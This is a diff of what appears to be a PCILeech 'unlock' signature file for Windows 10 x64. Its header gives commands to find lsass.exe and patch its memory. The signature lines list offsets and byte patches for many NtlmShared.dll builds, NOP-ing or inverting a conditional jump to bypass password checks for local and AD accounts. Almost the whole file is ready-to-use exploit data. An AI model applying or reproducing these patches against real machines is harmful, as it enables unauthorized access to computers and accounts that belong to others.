@@ -1,53 +1,88 @@
-# unlock signature for Windows 10 x64 version
-# syntax: see signature_info.txt for more information.
+# Unlock Signatures for Local and AD Accounts for Windows 10 x64 version
+#
+# Method 1: (faster):
+# 1.1 check pid of lsass.exe: pcileech pslist
+# 1.2 patch: pcileech patch -sig wx64_unlock_win10.sig -all -pid <pid_of_lsass>
+#
+# Method 2:
+# 2.1 patch: pcileech patch -sig wx64_unlock_win10.sig -all
+#
+# Syntax: see signature_info.txt for more information.
+# Generated on 2023-11-26 16:58:59
 #
 #
-# signature for Windows 10 x64 [NtlmShared.dll (2015-07-10)/10.0.10240.16384]
-5DF,FF154B1C,5E8,0F8518FB,5E8,909090909090
+# Signature for Windows 10 x64 [NtlmShared.dll 10.0.10240.16384 / 2015-07-10]
+# Signature for Windows 10 x64 [NtlmShared.dll 10.0.10240.18366 / 2019-09-30]
+5DC,488BCBFF154B1C0000,5E8,0F8518FBFFFF,5E8,909090909090
 #
-# signature for Windows 10 x64 [NtlmShared.dll (2015-10-30)/10.0.10586.0]
-62F,FF15B31B,638,0F8518FB,638,909090909090
+# Signature for Windows 10 x64 [NtlmShared.dll 10.0.10240.19387 / 2022-08-04]
+65C,488BCBFF15CB1B0000,668,0F8518FBFFFF,668,909090909090
 #
-# signature for Windows 10 x64 [NtlmShared.dll (2016-07-16)/10.0.14393.0]
-6dF,FF15D31B,6e8,0F8518FB,6e8,909090909090
-# signature for Windows 10 x64 [NtlmShared.dll (2019-02-06)/10.0.14393.2791]
-6F5,493BC60F8518FBFFFFB801,6F5,493BC60F8518FBFFFFB801,6F9,84
+# Signature for Windows 10 x64 [NtlmShared.dll 10.0.10240.19869 / 2023-03-30]
+66C,488BCBFF15BB1B0000,678,0F8518FBFFFF,678,909090909090
 #
-# signature for Windows 10 x64 [NtlmShared.dll (2017-03-18)/10.0.15063.0]
-615,FF15C51C,61e,0F852EFB,61e,909090909090
-# signature for Windows 10 x64 [NtlmShared.dll (2019-09-30)/10.0.15063.2106]
-625,FF15B51C,62e,0F852EFB,62e,909090909090
+# Signature for Windows 10 x64 [NtlmShared.dll 10.0.10586.0 / 2015-10-30]
+62C,488BCBFF15B31B0000,638,0F8518FBFFFF,638,909090909090
 #
-# signature for Windows 10 x64 [NtlmShared.dll (2017-09-29)/10.0.16299.15]
-615,FF15D51C,61e,0F852EFB,61e,909090909090
+# Signature for Windows 10 x64 [NtlmShared.dll 10.0.14393.0 / 2016-07-16]
+6DC,488BCBFF15D31B0000,6E8,0F8518FBFFFF,6E8,909090909090
 #
-# signature for Windows 10 x64 [NtlmShared.dll (2018-04-11)/10.0.17134.1]
-695,FF15551C,69e,0F852EFB,69e,909090909090
-# signature for Windows 10 x64 [NtlmShared.dll (2019-10-02)/10.0.17134.1067]
-6AB,493BC60F852EFBFFFFB001,6AB,493BC60F852EFBFFFFB001,6AF,84
+# Signature for Windows 10 x64 [NtlmShared.dll 10.0.14393.2791 / 2019-02-06]
+# Signature for Windows 10 x64 [NtlmShared.dll 10.0.14393.3269 / 2019-09-29]
+6EC,488BCBFF15C31B0000,6F8,0F8518FBFFFF,6F8,909090909090
 #
-# signature for Windows 10 x64 [NtlmShared.dll (2018-09-15)/10.0.17763.1]
-740,FF15B21B,749,0F840BFBFFFF,749,0F85
+# Signature for Windows 10 x64 [NtlmShared.dll 10.0.14393.5291 / 2022-08-07]
+76C,488BCBFF15431B0000,778,0F8518FBFFFF,778,909090909090
 #
-# signature for Windows 10 x64 [NtlmShared.dll (2019-03-19)/10.0.18362.1]
-# signature for Windows 10 x64 [NtlmShared.dll (2019-10-06)/10.0.18362.418]
-741,32C0E904FBFFFF,741,32C0E904FBFFFF,741,B001E904FBFFFF
+# Signature for Windows 10 x64 [NtlmShared.dll 10.0.14393.5850 / 2023-03-30]
+77C,488BCBFF15331B0000,788,0F8518FBFFFF,788,909090909090
 #
-# signature for Windows 10 x64 [NtlmShared.dll (2019-12-07)/10.0.19041.1]
-426,48FF155320,435,0F84BAFAFFFF,435,0F85
+# Signature for Windows 10 x64 [NtlmShared.dll 10.0.15063.1631 / 2019-02-06]
+# Signature for Windows 10 x64 [NtlmShared.dll 10.0.15063.2106 / 2019-09-30]
+622,488BCBFF15B51C0000,62E,0F852EFBFFFF,62E,909090909090
 #
-# signature for Windows 10 x64 [NtlmShared.dll (2022-08-04)/10.0.19041.1889]
-4B6,48FF15C31F,4C5,0F84BAFAFFFF,4C5,0F85
+# Signature for Windows 10 x64 [NtlmShared.dll 10.0.15254.245 / 2018-01-30]
+612,488BCBFF15C51C0000,61E,0F852EFBFFFF,61E,909090909090
 #
-# signature for Windows Server2022 x64 [NtlmShared.dll (2022-08-04)/10.0.20348.887]
-A6E,48FF15B328,A7D,0F84B2FAFFFF,A7D,0F85
+# Signature for Windows 10 x64 [NtlmShared.dll 10.0.16299.1268 / 2019-07-05]
+# Signature for Windows 10 x64 [NtlmShared.dll 10.0.16299.1448 / 2019-10-02]
+622,488BCBFF15C51C0000,62E,0F852EFBFFFF,62E,909090909090
 #
-# signature for Windows 11 x64 [NtlmShared.dll (2021-06-05)/10.0.22000.1]
-F8B,488BCB48FF,F9D,0F84B2FAFFFF,F9D,0F85
+# Signature for Windows 10 x64 [NtlmShared.dll 10.0.16299.192 / 2018-01-01]
+612,488BCBFF15D51C0000,61E,0F852EFBFFFF,61E,909090909090
 #
-# signature for Windows 11 x64 [NtlmShared.dll (2022-08-04)/10.0.22000.856]
-00B,488BCB48FF,01D,0F84B2FAFFFF,01D,0F85
+# Signature for Windows 10 x64 [NtlmShared.dll 10.0.17134.1067 / 2019-10-02]
+# Signature for Windows 10 x64 [NtlmShared.dll 10.0.17134.590 / 2019-02-06]
+6A2,488BCBFF15451C0000,6AE,0F852EFBFFFF,6AE,909090909090
 #
-# signature for Windows 11 x64 [NtlmShared.dll (2022-08-05)/10.0.22621.382]
-# signature for Windows 11 x64 [NtlmShared.dll (2022-09-27)/10.0.22621.608]
-FBD,48FF153C23,FCC,0F85C4FAFFFF,FCC,0F85
+# Signature for Windows 10 x64 [NtlmShared.dll 10.0.17134.523 / 2019-01-01]
+692,488BCBFF15551C0000,69E,0F852EFBFFFF,69E,909090909090
+#
+# Signature for Windows 10 x64 [NtlmShared.dll 10.0.17763.10935 / 2022-08-05]
+7CD,488BCBFF15221B0000,7D9,0F840BFBFFFF,7D9,0F85
+#
+# Signature for Windows 10 x64 [NtlmShared.dll 10.0.17763.194 / 2018-12-04]
+73D,488BCBFF15B21B0000,749,0F840BFBFFFF,749,0F85
+#
+# Signature for Windows 10 x64 [NtlmShared.dll 10.0.17763.316 / 2019-02-06]
+# Signature for Windows 10 x64 [NtlmShared.dll 10.0.17763.802 / 2019-10-02]
+74D,488BCBFF15A21B0000,759,0F840BFBFFFF,759,0F85
+#
+# Signature for Windows 10 x64 [NtlmShared.dll 10.0.17763.5122 / 2023-11-08]
+7DD,488BCBFF15121B0000,7E9,0F840BFBFFFF,7E9,0F85
+#
+# Signature for Windows 10 x64 [NtlmShared.dll 10.0.18362.1 / 2019-03-18]
+# Signature for Windows 10 x64 [NtlmShared.dll 10.0.18362.10022 / 2019-09-15]
+# Signature for Windows 10 x64 [NtlmShared.dll 10.0.18362.418 / 2019-10-06]
+72F,488BCBFF15C01B0000,73B,0F8409FBFFFF,73B,0F85
+#
+# Signature for Windows 10 x64 [NtlmShared.dll 10.0.19041.1 / 2019-12-07]
+423,488BCB48FF1553200000,435,0F84BAFAFFFF,435,0F85
+#
+# Signature for Windows 10 x64 [NtlmShared.dll 10.0.19041.2728 / 2023-03-09]
+4B3,488BCB48FF15C31F0000,4C5,0F84BAFAFFFF,4C5,0F85
+#
+# Signature for Windows 10 x64 [NtlmShared.dll 10.0.19041.2965 / 2023-04-27]
+# Signature for Windows 10 x64 [NtlmShared.dll 10.0.19041.3636 / 2023-10-20]
+# Signature for Windows 10 x64 [NtlmShared.dll 10.0.19041.3684 / 2023-10-17]
+4C3,488BCB48FF15B31F0000,4D5,0F84BAFAFFFF,4D5,0F85
